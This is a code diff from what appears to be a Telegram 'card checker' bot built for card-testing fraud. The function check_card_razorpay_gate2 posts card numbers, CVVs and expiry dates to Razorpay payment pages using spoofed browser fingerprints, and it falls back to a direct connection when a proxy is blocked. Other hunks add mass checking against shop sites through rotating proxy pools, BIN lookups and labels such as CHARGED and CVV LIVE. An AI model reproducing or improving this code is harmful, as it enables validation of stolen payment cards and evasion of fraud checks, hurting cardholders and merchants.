             r1 = await client.get(RAZORPAY_URL, headers={
                 'User-Agent': ua,
@@ -36147,11 +36239,18 @@ async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int =
             
             # Step 3: Create order with Chrome 136 headers
             print(f"📡 [STEP 3] Creating order...")
+            
+            # ============ FIX: Add customer data to order ============
             r2 = await client.post(
                 f'https://api.razorpay.com/v1/payment_pages/{plink}/order',
                 json={
                     'notes': {'comment': '', 'name': 'User'},
-                    'line_items': [{'payment_page_item_id': ppid, 'amount': RAZORPAY_AMOUNT}]
+                    'line_items': [{'payment_page_item_id': ppid, 'amount': RAZORPAY_AMOUNT}],
+                    'customer': {
+                        'name': 'Test User',
+                        'email': email,
+                        'contact': phone_short
+                    }
                 },
                 headers={
                     'Accept': 'application/json, text/plain, */*',
@@ -36271,45 +36370,48 @@ async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int =
             except:
                 pass
             
-            # Step 6: Checkout order
+            # ============ FIX: Step 6 - Checkout order without 'method' field ============
             print(f"📡 [STEP 6] Checkout order...")
             try:
+                checkout_data = {
+                    'notes[email]': email,
+                    'notes[phone]': phone_short,
+                    'payment_link_id': plink,
+                    'key_id': kyid,
+                    'contact': phone,
+                    'email': email,
+                    'currency': 'INR',
+                    '_[integration]': 'payment_pages',
+                    '_[device.id]': rzp_device_id,
+                    '_[library]': 'checkoutjs',
+                    '_[library_src]': 'no-src',
+                    '_[current_script_src]': 'no-src',
+                    '_[platform]': 'browser',
+                    '_[env]': '',
+                    '_[is_magic_script]': 'false',
+                    '_[os]': 'windows',
+                    '_[shield][fhash]': h,
+                    '_[shield][tz]': '0',
+                    '_[device_id]': rzp_device_id,
+                    '_[build]': RAZORPAY_BUILD,
+                    '_[shield][os]': 'windows',
+                    '_[shield][platform]': 'browser',
+                    '_[shield][browser]': 'chrome',
+                    '_[request_index]': '0',
+                    'amount': str(RAZORPAY_AMOUNT),
+                    'order_id': order_id,
+                    # 'method': 'card',  # REMOVED - causing 400 error
+                    'checkout_id': checkout_id,
+                }
+                
                 r5 = await client.post(
                     'https://api.razorpay.com/v1/standard_checkout/checkout/order',
                     params={'key_id': kyid, 'session_token': sessid, 'keyless_header': kh},
                     headers=api_headers,
-                    data={
-                        'notes[email]': email,
-                        'notes[phone]': phone_short,
-                        'payment_link_id': plink,
-                        'key_id': kyid,
-                        'contact': phone,
-                        'email': email,
-                        'currency': 'INR',
-                        '_[integration]': 'payment_pages',
-                        '_[device.id]': rzp_device_id,
-                        '_[library]': 'checkoutjs',
-                        '_[library_src]': 'no-src',
-                        '_[current_script_src]': 'no-src',
-                        '_[platform]': 'browser',
-                        '_[env]': '',
-                        '_[is_magic_script]': 'false',
-                        '_[os]': 'windows',
-                        '_[shield][fhash]': h,
-                        '_[shield][tz]': '0',
-                        '_[device_id]': rzp_device_id,
-                        '_[build]': RAZORPAY_BUILD,
-                        '_[shield][os]': 'windows',
-                        '_[shield][platform]': 'browser',
-                        '_[shield][browser]': 'chrome',
-                        '_[request_index]': '0',
-                        'amount': str(RAZORPAY_AMOUNT),
-                        'order_id': order_id,
-                        'method': 'card',
-                        'checkout_id': checkout_id,
-                    },
+                    data=checkout_data,
                     timeout=30
                 )
+                
                 print(f"   Checkout response status: {r5.status_code}")
                 if r5.status_code == 200:
                     try:
@@ -36362,71 +36464,174 @@ async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int =
             except Exception as e:
                 print(f"   CB flows error: {e}")
             
-            # Step 8: Create payment
+            # ============ FIX: Step 8 - Create payment with proper error handling ============
             print(f"🔥 [STEP 8] Creating payment...")
-            r7 = await client.post(
-                'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
-                params={'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': kh},
-                headers=api_headers,
-                data={
-                    'user_risk_providers_token': sardine,
-                    'notes[comment]': '',
-                    'notes[email]': email,
-                    'notes[phone]': phone_short,
-                    'notes[name]': 'User',
-                    'payment_link_id': plink,
-                    'key_id': kyid,
-                    'contact': phone,
-                    'email': email,
-                    'currency': 'INR',
-                    '_[integration]': 'payment_pages',
-                    '_[checkout_id]': coid_local,
-                    '_[device.id]': rzp_device_id,
-                    '_[env]': '',
-                    '_[library]': 'checkoutjs',
-                    '_[library_src]': 'no-src',
-                    '_[current_script_src]': 'no-src',
-                    '_[is_magic_script]': 'false',
-                    '_[platform]': 'browser',
-                    '_[referer]': RAZORPAY_URL,
-                    '_[shield][fhash]': h,
-                    '_[shield][tz]': str(random.choice([0, -60, -120, -180, -240, -300, -330, -360])),
-                    '_[device_id]': rzp_device_id,
-                    '_[build]': RAZORPAY_BUILD,
-                    '_[shield][os]': 'windows',
-                    '_[shield][platform]': 'browser',
-                    '_[shield][browser]': 'chrome',
-                    '_[request_index]': '1',
-                    '_[shield][screen_width]': str(random.choice([1920, 1366, 1536, 1440, 1280, 2560])),
-                    '_[shield][screen_height]': str(random.choice([1080, 768, 864, 900, 720, 1440])),
-                    '_[shield][color_depth]': str(random.choice([24, 32])),
-                    '_[shield][language]': 'en-US',
-                    'amount': str(RAZORPAY_AMOUNT),
-                    'order_id': order_id,
-                    'method': 'card',
-                    'card[number]': cc,
-                    'card[cvv]': cvv,
-                    'card[name]': 'User',
-                    'card[expiry_month]': mm,
-                    'card[expiry_year]': str(year),
-                    'save': '0',
-                    'dcc_currency': 'INR',
-                },
-                timeout=30
-            )
             
-            print(f"📥 Payment response status: {r7.status_code}")
-            print(f"📥 Payment response: {r7.text[:500]}")
+            # Try with proxy first, fallback to direct if 403
+            payment_success = False
+            payment_response = None
             
+            # Try with the current client (with proxy)
+            try:
+                r7 = await client.post(
+                    'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
+                    params={'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': kh},
+                    headers=api_headers,
+                    data={
+                        'user_risk_providers_token': sardine,
+                        'notes[comment]': '',
+                        'notes[email]': email,
+                        'notes[phone]': phone_short,
+                        'notes[name]': 'User',
+                        'payment_link_id': plink,
+                        'key_id': kyid,
+                        'contact': phone,
+                        'email': email,
+                        'currency': 'INR',
+                        '_[integration]': 'payment_pages',
+                        '_[checkout_id]': coid_local,
+                        '_[device.id]': rzp_device_id,
+                        '_[env]': '',
+                        '_[library]': 'checkoutjs',
+                        '_[library_src]': 'no-src',
+                        '_[current_script_src]': 'no-src',
+                        '_[is_magic_script]': 'false',
+                        '_[platform]': 'browser',
+                        '_[referer]': RAZORPAY_URL,
+                        '_[shield][fhash]': h,
+                        '_[shield][tz]': str(random.choice([0, -60, -120, -180, -240, -300, -330, -360])),
+                        '_[device_id]': rzp_device_id,
+                        '_[build]': RAZORPAY_BUILD,
+                        '_[shield][os]': 'windows',
+                        '_[shield][platform]': 'browser',
+                        '_[shield][browser]': 'chrome',
+                        '_[request_index]': '1',
+                        '_[shield][screen_width]': str(random.choice([1920, 1366, 1536, 1440, 1280, 2560])),
+                        '_[shield][screen_height]': str(random.choice([1080, 768, 864, 900, 720, 1440])),
+                        '_[shield][color_depth]': str(random.choice([24, 32])),
+                        '_[shield][language]': 'en-US',
+                        'amount': str(RAZORPAY_AMOUNT),
+                        'order_id': order_id,
+                        'method': 'card',
+                        'card[number]': cc,
+                        'card[cvv]': cvv,
+                        'card[name]': 'User',
+                        'card[expiry_month]': mm,
+                        'card[expiry_year]': str(year),
+                        'save': '0',
+                        'dcc_currency': 'INR',
+                    },
+                    timeout=30
+                )
+                
+                print(f"📥 Payment response status: {r7.status_code}")
+                payment_response = r7
+                payment_success = True
+                
+            except Exception as e:
+                print(f"⚠️ Payment with proxy failed: {e}")
+            
+            # If proxy failed with 403, try without proxy
+            if not payment_success or (payment_response and payment_response.status_code == 403):
+                print(f"🔄 Retrying payment without proxy...")
+                try:
+                    async with httpx.AsyncClient(
+                        timeout=httpx.Timeout(60.0, connect=15.0, read=50.0),
+                        verify=False,
+                        limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
+                        follow_redirects=True
+                    ) as client_no_proxy:
+                        r7 = await client_no_proxy.post(
+                            'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
+                            params={'x_entity_id': order_id, 'session_token': sessid, 'keyless_header': kh},
+                            headers=api_headers,
+                            data={
+                                'user_risk_providers_token': sardine,
+                                'notes[comment]': '',
+                                'notes[email]': email,
+                                'notes[phone]': phone_short,
+                                'notes[name]': 'User',
+                                'payment_link_id': plink,
+                                'key_id': kyid,
+                                'contact': phone,
+                                'email': email,
+                                'currency': 'INR',
+                                '_[integration]': 'payment_pages',
+                                '_[checkout_id]': coid_local,
+                                '_[device.id]': rzp_device_id,
+                                '_[env]': '',
+                                '_[library]': 'checkoutjs',
+                                '_[library_src]': 'no-src',
+                                '_[current_script_src]': 'no-src',
+                                '_[is_magic_script]': 'false',
+                                '_[platform]': 'browser',
+                                '_[referer]': RAZORPAY_URL,
+                                '_[shield][fhash]': h,
+                                '_[shield][tz]': str(random.choice([0, -60, -120, -180, -240, -300, -330, -360])),
+                                '_[device_id]': rzp_device_id,
+                                '_[build]': RAZORPAY_BUILD,
+                                '_[shield][os]': 'windows',
+                                '_[shield][platform]': 'browser',
+                                '_[shield][browser]': 'chrome',
+                                '_[request_index]': '1',
+                                '_[shield][screen_width]': str(random.choice([1920, 1366, 1536, 1440, 1280, 2560])),
+                                '_[shield][screen_height]': str(random.choice([1080, 768, 864, 900, 720, 1440])),
+                                '_[shield][color_depth]': str(random.choice([24, 32])),
+                                '_[shield][language]': 'en-US',
+                                'amount': str(RAZORPAY_AMOUNT),
+                                'order_id': order_id,
+                                'method': 'card',
+                                'card[number]': cc,
+                                'card[cvv]': cvv,
+                                'card[name]': 'User',
+                                'card[expiry_month]': mm,
+                                'card[expiry_year]': str(year),
+                                'save': '0',
+                                'dcc_currency': 'INR',
+                            },
+                            timeout=30
+                        )
+                        payment_response = r7
+                        print(f"📥 Payment without proxy status: {r7.status_code}")
+                except Exception as e:
+                    print(f"❌ Payment without proxy also failed: {e}")
+            
+            if not payment_response:
+                return {
+                    "status": "error",
+                    "result": "PAYMENT_FAILED",
+                    "message": "Payment request failed",
+                    "status_display": "⚠️ PAYMENT ERROR",
+                    "status_category": "error",
+                    "elapsed": time.time() - start_time,
+                    "price": "₹10",
+                    "gateway": "Razorpay"
+                }
+            
+            r7 = payment_response
             r7_data = {}
+            
             try:
                 r7_data = r7.json()
                 print(f"📥 Parsed JSON: {json.dumps(r7_data, indent=2)[:500]}")
             except:
                 print(f"📥 Not JSON or parse error")
+                # If response is HTML (403 Forbidden), try to get payment_id from URL
+                if r7.status_code == 403 and 'payment' in r7.text:
+                    # Try to extract payment ID from the response
+                    match = re.search(r'pay_[A-Za-z0-9]+', r7.text)
+                    if match:
+                        payment_id = match.group(0)
+                        print(f"✅ Extracted payment ID from HTML: {payment_id}")
+                    else:
+                        payment_id = None
+                else:
+                    payment_id = None
             
+            # Get payment_id from JSON or extracted from HTML
             payment_id = r7_data.get('payment_id') or r7_data.get('id')
             if not payment_id:
+                # Try to get from error metadata
                 payment_id = r7_data.get('error', {}).get('metadata', {}).get('payment_id')
             
             # Check for error response
@@ -36496,8 +36701,6 @@ async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int =
                         "gateway": "Razorpay"
                     }
             
-            
-            
             if not payment_id:
                 return {
                     "status": "declined",
@@ -36540,28 +36743,42 @@ async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int =
             
             # Step 10: Final cancel / result
             print(f"📡 [STEP 10] Getting final result...")
-            r9 = await client.get(
-                f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel',
-                params={'key_id': kyid, 'session_token': sessid, 'keyless_header': kh},
-                headers=api_headers,
-                timeout=30
-            )
+            try:
+                r9 = await client.get(
+                    f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel',
+                    params={'key_id': kyid, 'session_token': sessid, 'keyless_header': kh},
+                    headers=api_headers,
+                    timeout=30
+                )
+            except:
+                # If cancel fails, try to get status directly
+                try:
+                    r9 = await client.get(
+                        f'https://api.razorpay.com/v1/payments/{payment_id}',
+                        params={'key_id': kyid},
+                        headers={'User-Agent': ua},
+                        timeout=30
+                    )
+                except:
+                    r9 = None
             
             elapsed = time.time() - start_time
-            print(f"📥 Final response status: {r9.status_code}")
-            print(f"📥 Final response: {r9.text[:500]}")
             
-            final_data = {}
-            try:
-                final_data = r9.json()
-                print(f"📥 Final JSON: {json.dumps(final_data, indent=2)[:500]}")
-            except:
-                pass
-            
-            final_text = r9.text
+            if r9:
+                print(f"📥 Final response status: {r9.status_code}")
+                try:
+                    final_data = r9.json()
+                    print(f"📥 Final JSON: {json.dumps(final_data, indent=2)[:500]}")
+                    final_text = r9.text
+                except:
+                    final_data = {}
+                    final_text = r9.text if r9.text else ''
+            else:
+                final_data = {}
+                final_text = ''
             
             # Check for successful charge
-            if 'razorpay_payment_id' in final_text:
+            if 'razorpay_payment_id' in final_text or (final_data and final_data.get('status') == 'captured'):
                 return {
                     "status": "success",
                     "result": "CHARGED",
@@ -36634,12 +36851,13 @@ async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int =
                     "price": "₹10",
                     "gateway": "Razorpay"
                 }
+            
             if 'risk' in error_upper or 'payment_risk_check_failed' in reason:
                 return {
                     "status": "declined",
                     "result": "RISK_DECLINED",
                     "message": f"Payment declined ({reason})" if reason else "Payment declined (risk check failed)",
-                    "reason": reason, 
+                    "reason": reason,
                     "status_display": "❌ DECLINED",
                     "status_category": "declined",
                     "elapsed": elapsed,
@@ -36658,8 +36876,6 @@ async def check_card_razorpay_gate2(card: str, proxy: str = None, user_id: int =
                 "price": "₹10",
                 "gateway": "Razorpay"
             }
-            
-
             
     except httpx.TimeoutException:
         print(f"⏰ Timeout error")
@@ -38767,7 +38983,7 @@ async def send_gif_with_result(
 RAZORPAY_API_POOL_CONFIG = [
     {
         "name": "Razorpay API (Railway)",
-        "url": "https://rzapi-production-d1b0.up.railway.app/razorpay",
+        "url": "https://rzapi-production-3f42.up.railway.app/razorpay",
         "type": "get",
         "params_format": "path",
         "timeout": 45,
@@ -38783,24 +38999,7 @@ RAZORPAY_API_POOL_CONFIG = [
         "response_format": "ravenxkiller",
         "description": "Railway Razorpay API"
     },
-    {
-        "name": "r2 (Railway)",
-        "url": "https://rzapi2-production-5961.up.railway.app/razorpay",
-        "type": "get",
-        "params_format": "path",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "card_param": "cc",
-        "amount": 100,
-        "currency": "INR",
-        "response_format": "ravenxkiller",
-        "description": "Railway Razorpay API"
-    },
+    
 ]
 
 
@@ -45502,6 +45701,13 @@ async def mass_check_autosopi(update: Update, context: ContextTypes.DEFAULT_TYPE
     user_id = update.effective_user.id
     message = update.effective_message
     
+    has_proxies, proxy_status = await check_user_has_proxies(user_id, update, context)
+    
+    if not has_proxies:
+        warning_msg = get_proxy_warning_message(user_id)
+        await message.reply_text(warning_msg, parse_mode=ParseMode.HTML)
+        return
+    
     # Check if user already has an active session
     if user_id in autosopi_active_tasks:
         await message.reply_text(
@@ -45806,6 +46012,7 @@ RETRY_ERRORS = [
 # Errors that should trigger SITE REMOVAL (only these)
 SITE_REMOVAL_ERRORS = [
     "SUBMIT REJECTED", 
+    "No products under $10 found!",
     "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED",
     "MERCHANDISE_EXPECTED_PRICE_MISMATCH",
     "Payment method not available",
@@ -46289,9 +46496,11 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
         CONCURRENCY = {
             "free": 10,
             "premium": 30,
-            "ultimate": 100,
-            "admin": 150,
+            "ultimate": 50,
+            "admin": 5,
         }.get(tier, 80)
+        
+       
         
         # Get user's working proxies
         user_proxies = []
@@ -46300,6 +46509,11 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                 user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
                 print(f"🔌 Using {len(user_proxies)} working proxies for rotation")
         
+        elif not user_proxies and global_proxy_pool.enabled and global_proxy_pool.proxies:
+            user_proxies = global_proxy_pool.proxies.copy()
+            print(f"🌐 Using {len(user_proxies)} global proxies from global pool")
+            
+ 
         # Premium emojis for progress
         approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
         charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
@@ -46370,6 +46584,8 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
         async def process_single_card(card: str, idx: int):
             """Process a single card - NO DELAYS"""
             nonlocal proxy_rotation_counter, processed_count
+        
+            await asyncio.sleep(random.uniform(0.5, 1.0))  
             
             async with semaphore:
                 site = autosopi_site_manager.get_next_site_weighted()
@@ -46382,9 +46598,20 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                 
                 # Get rotating proxy
                 current_proxy = None
-                if user_proxies:
-                    proxy_rotation_counter += 1
-                    current_proxy = user_proxies[proxy_rotation_counter % len(user_proxies)]
+                
+                if global_proxy_pool.enabled and global_proxy_pool.proxies:
+                    current_proxy = global_proxy_pool.get_next_proxy()
+                    if current_proxy:
+                        proxy_rotation_counter += 1
+                        print(f"🌐 [GLOBAL ONLY] Using global proxy #{proxy_rotation_counter}: {mask_proxy(current_proxy)}")
+                    
+                    else:
+                        print(f"⚠️ [GLOBAL ONLY] No global proxies available")
+
+                     
+                    if not current_proxy:
+                         print(f"⚠️ [Proxy] No global proxy available, using direct connection")
+
                 
                 start_time_card = time.time()
                 
@@ -46433,7 +46660,7 @@ async def autosopi_mass_check_logic(update: Update, context: ContextTypes.DEFAUL
                 is_cvv_live = any(x in response_upper for x in ["CVV LIVE", "INCORRECT_CVV", "CVV_MISMATCH"])
                 
                 if is_charged:
-                    stats["charged"] += 1
+                    pass
                 # Get BIN info safely
                 try:
                     bin_info = await get_bin_info(card, u_id)
@@ -47104,7 +47331,9 @@ async def show_normal_sites_command(update: Update, context: ContextTypes.DEFAUL
     msg += f"\n💡 Use <code>/rnormal</code> to remove all normal sites."
     
     await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
-    
+   
+   
+ 
 
 # ============ REMOVE PLAN COMMAND ============
 # Add this to your f13.py
@@ -56020,6 +56249,11 @@ def main():
     app.add_handler(CommandHandler("globalproxy_stats", globalproxy_stats_command))
     app.add_handler(CommandHandler("globalproxy_clean", globalproxy_clean_command))
     app.add_handler(CommandHandler("globalproxy_rotate", globalproxy_rotate_command))
+    
+    app.add_handler(CommandHandler("massglobalproxy", mass_proxy_global_command))
+    
+    app.add_handler(CommandHandler("globalmode", toggle_global_mode_command))
+    app.add_handler(CommandHandler("globalmode_status", global_mode_status_command))
     
     
     app.add_handler(MessageHandler(
